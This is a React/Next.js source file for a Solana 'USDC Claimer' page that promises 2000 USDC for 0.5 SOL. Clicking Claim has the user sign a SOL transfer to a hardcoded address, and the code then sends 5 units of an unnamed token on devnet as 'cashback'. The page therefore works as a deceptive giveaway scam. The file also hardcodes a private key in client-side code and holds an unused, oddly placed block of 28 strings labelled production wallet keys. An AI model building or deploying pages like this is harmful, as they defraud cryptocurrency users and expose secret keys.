/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "4FMLF31SAn3pes9CA3bGBK4VkGD2TEg2BWwww3VRMFupoMZjjUCUwwtwu9Pfgo4cAMeFicET4PievPrp6obhbi6Y"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "3agTjJ9V6oih3rgkDQe4DbG98ZX6ZG1bAJVGSsfu2vV7WQwC7yzwVHLzUCJr4RZ2bdAkLHfhQLQU6bGVm3q8Mocj",
  "key1": "47HVDRtcwbc4eteiLM9bSR5uAorwFyBmDLZgy8EmFFbhqiNfmuudjaEDxv4zMg8tw6SmYnfyFGyXWECEZN8kVZj9",
  "key2": "5Yc1aTGnCH671Kf36WEYFm2PjeCpm5oDMNdAF58YSAk53Q9x889hg8sXHSrH3j4ERw2CY7SBUx6or3VxgsyAT1SL",
  "key3": "59qYjcyTxPrPAqp6i7XbNKq5bENZBBNuiaHd3ybhcACyUD9AXrLYY5YwiU6JnqWrXevznmdoBDibgmB1AHx6EBAm",
  "key4": "kxPSb9ZPrtYysyqrfRW5ktp5DSGJcBUqZZJzkXXbWFv4JVRAUcmzjm1Goad4MoztveVdk6XLN4Lt7tvYhZbFzeB",
  "key5": "2rLkYXSY9Z9pjectXs1o596Mf254TdKjNoYSjhkgZVc6WSjDKTz1KYG9nTFRkuRiSMfhZUDGctpY78B8ZQquZS16",
  "key6": "5xsdAUw4QJpiwZszUK2ajCM6XRcVziwRf4QzuVYFafY3BFuV4p4h43rHhGrv3WGCqUFzaM9EQ3t5CEgDJcLUe9Na",
  "key7": "3DQGeqNi1S9L8k83kEh8dHRksvt6oEH2iRYqidARPqSt88vVmDCeWCY3S8iPbpEN8ybqUjXfoCxcoDjbzDsL1ojK",
  "key8": "2JNkixd7b65jiY9G8MPDqE9GjZ659xJjzuBM93wb4iXGS7y7RcfAmgA4pJujuH4UtZZpEMSaLoHdhftyK4FaE6d",
  "key9": "Af9DEuFudWXn9SR38SRxVVuLuQ233eJJtmsQXXgRk3kiP9JRABV3ZSpJCqHRr795gnPaXYFex9MvUVxnVnVkTLY",
  "key10": "4XzCu1EPmvoWwXKbWCqksMCP7wy8gjhv6vVopcVEYv9PFefFwUXWmf6SmhTkcv7WxmkHeyvAEvVepP74joZ2CJA7",
  "key11": "4zQSnrZNUk9PWSHDubF1eb9ZvrwC4zQu4R7MsRNGBY9KFQda7oZYTzEe9akj6GbB1WkLXyvkjwqF15Kf8mjh5TFQ",
  "key12": "5SgtLGA8TM4c7zXuwVixZ4bvqoW948uiRau6kFc2Ao4pMCjeeWcAhmpRVEGh4pMR3jvJCLDajjm84txPccuxeAW2",
  "key13": "MjWJhUPjkq8DoYb8FREh6oD8CFjMD65otSBJi1ST8XGbtECinCSgC6S61shM6UAKNS6GWZogkMq9srEqgb3opTf",
  "key14": "5JWB21jo391hpBPG2nrVzpivnxmVqixjBS7ARKHm15xkQChT8csHcNg7rNXAB2Gx1UKsUnYs3EAtEjmtweWLc7eN",
  "key15": "5y1xSSNvYcf31nbBd26n1iyqCDUFf9sAZdX8rkpoUNMS5SyGMNCK5sTWMhW5b5znXN8D2dXxmiJ7f2BJo3B5dbMB",
  "key16": "4QJca9T62Ydf2H5hSWjzh96BhJZazTic6fHXz6wCHCoNN31tDaTkQFHj3zhY3Km6J3kdicbuzuNmF9EcEoVTiH5A",
  "key17": "23My1ug23PvvcqpBG9M7bxtKG9TYnBKmpmFHpfDCYrLnaUXiCJxfijDF8LzYWFQ5pDPHPAWs5ifWUr3SgH1RRc71",
  "key18": "5US7XhNW9TAnnZ1o5vjNbm7wCBo4H3hHP1dCoAjTX1Sp84kMrAK7YnmkHmGsPVe56JM41wMNvMsgto39JAykVbjo",
  "key19": "EDScVbWFEPfSy3kZZ8TAtFH6J6BPTLbcyGU4JwubP4WGsdVJh1YgN37qVW5YG2qA1fiws4VMJKcomt3urMnbZwx",
  "key20": "3PyxhMtjb2BwdBHfSzEG2G9ey9TmwByvfAVqZxTumkH2LQqgQdRWSPFm7FqtLVhKSHRzkwvSPBu9yQhfw5PPueFx",
  "key21": "51QyxryhPZ6GDvoumxCxcd5SdkULSWbpfo469fsAfQ8bhffwxFoM9iLbhh5EzrqiRFJGo7PyyyYVaNRooKVEYFHY",
  "key22": "47NacHAKN3gGBDb37vR7xtSu2qvHs39fMk354nL2a5XxTAync6ErUgaFu2NZcWEoUeiNPbEUAyW28sop47LYvc1p",
  "key23": "3AW8YDY4VSQgDrCtKApBySghbgGdpXMZTFHwdxkUSoxKkyKENV83feyBvDi4kozmzvDhhMsZwETnJ6aVYE1mFRKf",
  "key24": "2UAw5sLQMjHHRwnzmeR692vxZcog6FFDXCHk4zQYsp9DGt29bq2kiHYsjbMxJaWdCoAB7vYXJ5ZVa8Dd855tbMSU",
  "key25": "27YXdLEBoqBeYDkM3XDFUs6auxFJMGJCvSUyN5g5oAuSUdLBpRvHyt2cP9FEsj4hTR89suZpWRD2ZxcvC7KcRhVY",
  "key26": "4Dwgo8s3AvRUE4X5vVjZNv9tBreAqMwaYZn6mpZruZ94LFDPxjCVVhwVyzGwZDXhosQm8m5J6sVfvx2XP2rw4n17",
  "key27": "3kTdXtQkkHXbRkNKbahMPSySxsvM6ph7g1eZL5RBkfsFt9qe6SaMWxQrrTZp1S8RJfgbAuv6RegYdtnGkGDHvCJg"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
